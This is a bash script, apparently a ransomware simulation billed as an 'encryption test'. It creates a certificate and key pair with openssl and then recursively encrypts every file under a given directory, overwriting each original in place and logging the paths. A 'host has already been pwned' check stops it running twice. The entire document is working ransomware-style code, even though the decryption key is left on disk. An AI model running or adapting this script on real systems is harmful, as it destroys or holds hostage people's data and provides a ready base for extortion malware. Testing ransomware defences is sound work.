#!/bin/bash

if [ $# -ne 1 ]; then
    echo "This script requires one argument, which is a file path to encrypt. Exiting..."
    exit 1
fi

if [ -f "$HOME/encrypted-list.txt" ]; then
        echo "This host has already been pwned! Exiting..."
    exit 0
fi

if [ ! -f "ca.pem" ]; then
    echo "Creating a cert keychain and key pair for this encryption test..."
        openssl req -new -newkey rsa:2048 -nodes -out ca.csr -keyout ca.key -subj "/C=US/ST=CA/L=Redwood City/O=Security Experts LLC"
    openssl x509 -trustout -signkey ca.key -days 365 -req -in ca.csr -out ca.pem
    echo "Created ca.csr, ca.pem, and ca.key in the current directory. The public key in ca.pem will be used for encryption and the private key at ca.key can be used for decryption."fi
fi

echo -e "Recursively encrypted files found at $1...\n"

recurse () {
        for x in "$1"/*;do
        if [[ (-f $x) ]];then
                openssl smime -encrypt -binary -aes-256-cbc -in $x -out blob -outform DER ca.pem
                    mv -f blob $x
                    echo $x >> $HOME/encrypted-list.txt
                elif [[ (-d $x) ]];then
                        recurse "$x"
                else
                        :
                fi
        done

}

recurse $1
echo -e "All Done! A log of encrypted files can be found at $HOME/encrypted-list.txt"
